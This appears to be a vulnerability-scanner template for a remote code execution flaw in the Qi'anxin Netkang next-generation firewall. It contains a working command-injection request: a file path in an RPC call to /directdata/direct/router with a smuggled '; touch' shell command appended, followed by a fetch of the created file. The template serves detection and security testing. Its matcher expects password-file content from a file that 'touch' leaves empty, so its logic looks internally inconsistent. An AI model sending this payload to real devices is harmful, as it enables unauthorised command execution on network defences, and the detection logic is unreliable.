id: qi-anxin-netkang-next-generation-firewall-rce
info:
  name: Qi'anxin Netkang Next Generation Firewall - Remote Code Execution
  author: pikpikcu
  severity: critical
  description: The Qi'anxin Netkang Next Generation Firewall is vulnerable to remote
    code execution.
  reference:
  - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: rce,firewall,intrusive
  metadata:
    impact: The vulnerability of Qi'anxin Netkang Next Generation Firewall to remote
      code execution can have a significant impact on the security of the system it
      is designed to protect.
    recommendation: I strongly advise to immediately patch Qi'anxin Netkang Next Generation
      Firewall to prevent potential remote code execution attacks.
requests:
- raw:
  - 'POST /directdata/direct/router HTTP/1.1

    Host: {{Hostname}}


    {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;touch
    /var/www/html/{{randstr}}.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}

    '
  - 'GET /{{randstr}}.txt HTTP/1.1

    Host: {{Hostname}}

    '
  matchers-condition: and
  matchers:
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
